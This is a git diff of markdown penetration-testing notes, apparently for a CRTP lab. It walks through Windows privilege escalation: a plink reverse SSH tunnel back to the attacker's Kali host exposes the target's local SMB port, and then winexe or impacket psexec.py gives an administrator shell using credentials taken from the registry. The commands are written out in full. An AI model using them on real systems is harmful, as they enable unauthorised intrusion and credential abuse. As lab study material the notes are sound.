@@ -918,12 +918,15 @@ When I did nmap scan on the machine. we didn't get either SMB nor RDP
 
 2. check the internal open ports in the machine using `"netstate -ano"`. port 445 is locally opened so you need to check what is there. use ssh with `"plink.exe"` for port forwarding
 download from here  https://github.com/fwbuilder/w32-bin/blob/master/plink.exe
+
 ![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/64ca3155-5c20-4c3f-b8f4-47f0232620e1)
 
 ## <span style="color:lightgreen">Exploitation</span>
 
 1.  install ssh and edit the config file (kali)
--     apt install ssh && nano /etc/ssh/sshd_config
+```
+apt install ssh && nano /etc/ssh/sshd_config
+```
 2.  change #PermitRootLogin line in the sshd_config file to the following
 ```
 PermitRootLogin yes
@@ -942,8 +945,8 @@ plink.exe <kaliUser>@<kaliIP> -R <SMBserviceinWindows port 445>:127.0.0.1:<OpenP
 
 5.  now you need to use winexe tool to execute a command in Windows
 -     winexe -U Administrator%<Password that you found in the registry> //127.0.0.1 "cmd.exe"
-
-5. You also can get an elevated shell using psexec.py  https://github.com/fortra/impacket/blob/master/examples/psexec.py 
+#OR
+6. You also can get an elevated shell using psexec.py  https://github.com/fortra/impacket/blob/master/examples/psexec.py 
 ```
 psexec.py admin:password123@127.0.0.1 cmd  #creds that you found in registry using winPEASE
 ```
